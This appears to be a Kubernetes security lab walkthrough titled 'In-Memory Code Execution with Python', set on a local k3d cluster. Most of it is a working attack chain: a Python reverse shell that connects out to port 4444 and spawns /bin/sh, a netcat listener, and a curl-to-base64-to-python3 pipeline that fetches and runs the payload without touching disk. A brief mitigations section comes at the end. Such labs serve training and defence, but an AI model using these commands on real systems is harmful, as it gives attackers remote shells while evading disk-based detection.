# Lab 4 – In-Memory Code Execution with Python

## Objective
Demonstrate how an attacker can execute a malicious payload entirely in memory inside a compromised pod, bypassing disk-based detection and leaving no files behind.

---

## 1. Create the Lab Cluster

```bash
k3d cluster create lab4 \
  --agents 1 \
  --servers 1 \
  --k3s-arg "--disable=traefik@server:0"
```

Verify the cluster is running:
```bash
kubectl get nodes
```

---

## 2. Lab Setup

Create a dedicated namespace:
```bash
kubectl create ns lab4
```

Deploy an attacker pod with Python installed:
```bash
kubectl -n lab4 run attacker-pod \
  --image=python:3.11-alpine \
  --restart=Never \
  --command -- sleep infinity
```

Check pod status:
```bash
kubectl -n lab4 get pods -o wide
```

---

## 3. Prepare the Attacker Payload (on Host)

Create a Python reverse shell payload:
```bash
cat <<'EOF' > payload.py
import socket,subprocess,os
HOST="host.k3d.internal"
PORT=4444
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((HOST,PORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty; pty.spawn("/bin/sh")
EOF
```

Base64-encode it so it can be streamed safely:
```bash
base64 -w0 payload.py > payload.b64
```

Host the file over HTTP:
```bash
python3 -m http.server 8000
```

---

## 4. Start a Listener

On your attacker host:
```bash
nc -lvnp 4444
```

---

## 5. Exploit Demonstration

Exec into the attacker pod:
```bash
kubectl -n lab4 exec -it attacker-pod -- /bin/sh
```

Inside the pod, download, decode, and execute **in memory**:
```bash
apk add --no-cache curl  # If curl is missing

curl http://host.k3d.internal:8000/payload.b64 \
  | base64 -d \
  | python3
```

If successful, your netcat listener should receive a shell.

Commands from reverse shell
```bash
id
uname -a
hostname

pgrep -f '^python3$' | xargs -r -I{} sh -c 'echo PID:{}; tr "\0" " " </proc/{}/cmdline; echo'
#expected output is python with NO payload.py argument

```


---

## 6. Key Takeaways

- **Stealth:** No files written to disk, bypassing many scanners.
- **Requirements:** Python interpreter inside the container.
- **Detection Gaps:** Requires runtime monitoring to detect.
- **Real-World Applicability:** Works with other interpreters like Bash, Perl, Ruby.

---

## 7. Mitigations

- Use **distroless** or **scratch** base images (no interpreter binaries like Python).
- Apply **seccomp** or **AppArmor** profiles to restrict process execution.
- Monitor runtime behavior with **Falco** or **Tracee**.

---

## 8. Cleanup

```bash
k3d cluster delete lab4
```
